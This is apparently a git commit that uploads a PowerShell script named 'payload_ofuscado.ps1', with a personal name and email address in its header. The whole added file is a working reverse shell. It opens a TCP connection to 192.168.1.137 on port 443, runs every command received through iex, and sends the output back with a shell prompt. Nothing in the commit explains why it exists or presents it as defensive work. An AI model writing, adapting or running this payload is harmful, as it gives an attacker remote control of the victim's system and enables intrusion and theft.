6ed4911a59652fad318e1d448bfbe987bc3ed262
Raí Amorim <raidugo.21@outlook.com>
2025-04-06 16:48:00 -0300

    Add files via upload

---
+++ payload_ofuscado.ps1
@@ -0,0 +1,10 @@
+
+$h='192.168.1.137';$p=443;
+$c=New-Object Net.Sockets.TCPClient($h,$p);
+$s=$c.GetStream();[byte[]]$b=0..65535|%{0};
+while(($i=$s.Read($b,0,$b.Length)) -ne 0){
+$d=(New-Object -TypeName Text.ASCIIEncoding).GetString($b,0,$i);
+$sb=(iex $d 2>&1 | Out-String);
+$sb2=$sb + 'PS ' + (pwd).Path + '> ';
+$sbB=([text.encoding]::ASCII).GetBytes($sb2);
+$s.Write($sbB,0,$sbB.Length);$s.Flush()}
